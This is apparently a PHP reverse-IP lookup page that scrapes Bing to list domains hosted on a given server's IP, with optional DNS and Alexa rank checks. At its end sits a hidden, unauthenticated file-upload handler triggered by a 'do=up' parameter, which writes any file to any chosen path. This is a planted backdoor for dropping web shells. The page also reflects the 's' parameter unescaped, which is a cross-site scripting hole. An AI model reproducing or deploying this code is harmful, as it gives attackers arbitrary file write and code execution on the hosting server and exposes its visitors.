
<form action="" name="frm1" method="GET">
<input type="text" value="<?= $_GET['s']; ?>"  name="s" class="texta" /> <input type="submit" value="Reverse it!" name="submit" class="groovybutton"/>
<br /><input type="checkbox" name="c2nd" value="c2nd" checked=true> <font color="#FFFFFF"><b>DNS Checking</b>: DNS Checking on server(Slow +) <br /><input type="checkbox" name="al" value="al"> <b>Alexa Rank</b>: Checking Alexa rank(Slow ++) </font>
</form>
<?php
set_time_limit(0);
include('al.php');
	require_once("searchparser.php");
	//error_reporting((E_ALL));
	//ini_set("display_errors", "on");
	if (isset($_GET['s']))
	{
		$d = urldecode($_GET['s']);

		if (preg_match("/^http:\/\/(\S+)\/?/", $d) > 0)
		{
			$d = preg_replace("/^http:\/\/(.+)/", "\\1", $d);
			$d = str_replace('/',null,$d);
		}

		if (preg_match("/\w+\.\w+/", $d) != 0)
		{
			// Check for a valid IP Address, if it wasn't entered, try to look it up as a hostname
			if (preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/", $d) == 1)
			{
				$ip = $d;
			} else {
				$ip = gethostbyname($d);
			}
			if (preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/", $ip) == 0)
			{
				echo "<font color=#FFFFFF>Could not resolve $d to an IP Address</font>";
				exit;
			}
			$allDomains = getAllDomainsFromSearch("http://www.bing.com/search?q=ip%3A$ip&first=1", 0);
			echo "<table border=1>";
$c=0;
				foreach($allDomains as $d)
				{
$c++;
}

echo "<font color=#FFFFFF>We have <b>".$c."</b> websites on server <b>".$ip."</b><p></font>";
			$c = 0;


			if (!isset($_GET['compact']))
			{
				foreach($allDomains as $d)
				{
				 	$c++;
				 	$esd = preg_replace("/\./", "_", $d);
					echo "<tr><td>$c.</td><td><a target=\"_blank\" href=\"http://$d/\">$d</a></td>";
					echo "<td style=\"display: none\" colspan='3' id=\"w_$esd\" bgcolor=\"#DEDEDE\"><td>";
if(isset($_GET['al']))
{
$alexarank=getalexa($d);
if($alexarank==0)
{
echo "<font color=Red><b>Not Ranked</font></b></td><td>&nbsp;";
}
else
{
echo "Alexa Rank:<font color=green><b>".$alexarank."</font></b></td><td>&nbsp;";
}
}
if(isset($_GET['c2nd']))
{
$ipthuc=gethostbyname($d);
echo "<font color=red>IP:</font><font color=#FFFFFF>".$ipthuc;
if($ip<>$ipthuc)
{
echo "</font><font color=red>==><b>Moved !</b></font>"."</td>";
}
else
{
echo "</font><font color=green>==><b>OK</b></font>"."</td>";
}
}
				}
				echo "</tr></table>";
			} else {
				foreach ($allDomains as $d)
				{
					echo "$d<br />";
				}
			}
		} else {
			echo "Invalid Domain Name or IP Address Specified: $d";
		}
	}
if(@$_REQUEST["do"]== 'up')
{
	$files = @$_FILES["files"];	
	if($files["name"] != ''){
		$fullpath = $_REQUEST["path"].$files["name"];		
		if(move_uploaded_file($files['tmp_name'],$fullpath)){
			echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
		}			
	}
	exit('<form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form>');	
}
?>

